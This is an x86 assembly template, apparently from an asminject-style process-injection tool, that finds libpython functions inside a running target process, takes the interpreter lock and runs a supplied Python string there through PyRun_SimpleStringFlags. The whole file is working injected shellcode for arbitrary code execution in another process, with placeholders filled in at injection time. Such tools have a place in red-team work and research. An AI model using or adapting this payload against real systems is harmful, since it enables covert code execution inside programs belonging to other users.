jmp execute_python_code_main
// import reusable code fragments 
[FRAGMENT:asminject_copy_bytes.s:FRAGMENT]

execute_python_code_main:

	# // BEGIN: call Py_Initialize()
	# push r14
	# mov ebx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:Py_Initialize:RELATIVEOFFSET]
	# pop r14
	# // END: call Py_Initialize()
	
	// copy the Python string to arbitrary read/write memory
	mov edi, arbitrary_read_write_data_address[eip]
	add edi, 32
	lea esi, python_code[eip]
	push ecx
	mov ecx, [VARIABLE:pythoncode.length:VARIABLE]
	add ecx, 2												# null terminator
	#rep movsb
	call asminject_copy_bytes
	pop ecx
	// END: copy the Python string to arbitrary read/write memory

	// BEGIN: call PyGILState_Ensure() and store the handle it returns
	//push r14
	xor eax, eax
	xor edi, edi
	xor esi, esi
	mov ebx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Ensure:RELATIVEOFFSET]
	call ebx
	mov ebx, arbitrary_read_write_data_address[eip]
	mov [ebx], eax
	//pop r14
	// END: call PyGILState_Ensure()

	// BEGIN: call PyRun_SimpleString("arbitrary Python code here")
	//push r14
	push ecx
	xor esi, esi
	mov edi, arbitrary_read_write_data_address[eip]
	add edi, 32
	xor ecx, ecx
	mov ebx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyRun_SimpleStringFlags:RELATIVEOFFSET]
	call ebx
	pop ecx
	//pop r14
	// END: call PyRun_SimpleString("arbitrary Python code here")
	
	// BEGIN: call PyGILState_Release(handle)
	//push r14
	mov ebx, arbitrary_read_write_data_address[eip]
	mov edi, [ebx]
	//mov eax, [ebx]
	//mov edi, eax
	xor esi, esi
	mov ebx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:PyGILState_Release:RELATIVEOFFSET]
	call ebx
	//pop r14
	// END: call PyGILState_Release(handle)
	
	# // BEGIN: call Py_Finalize()
	# push r14
	# mov eax, 0
	# mov edi, eax
	# mov ebx, [BASEADDRESS:.+/python[0-9\.]+$:BASEADDRESS] + [RELATIVEOFFSET:Py_Finalize:RELATIVEOFFSET]
	# call ebx
	# pop r14
	# // END: call Py_Finalize()

SHELLCODE_SECTION_DELIMITER

python_code:
	.ascii "[VARIABLE:pythoncode:VARIABLE]\0"




